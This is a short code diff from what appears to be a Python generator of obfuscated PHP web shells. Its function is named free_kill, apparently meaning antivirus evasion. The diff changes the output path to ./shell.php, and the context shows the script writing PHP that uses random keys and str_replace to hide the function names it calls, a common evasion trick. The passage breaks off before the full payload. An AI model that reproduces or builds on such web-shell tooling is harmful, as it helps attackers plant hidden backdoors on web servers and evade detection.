@@ -26,7 +26,7 @@ def free_kill():
     keys = ''.join(random.sample(string.ascii_letters+string.digits, 4))
     # print(keys)
     
-    with open("C:/Users/Administrator/Desktop/shell.php","w+") as f:
+    with open("./shell.php","w+") as f:
         statement = f"""<?php
 $rep = str_replace("{replace_string[1]}", "", "{replace_string[0]}");
 $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
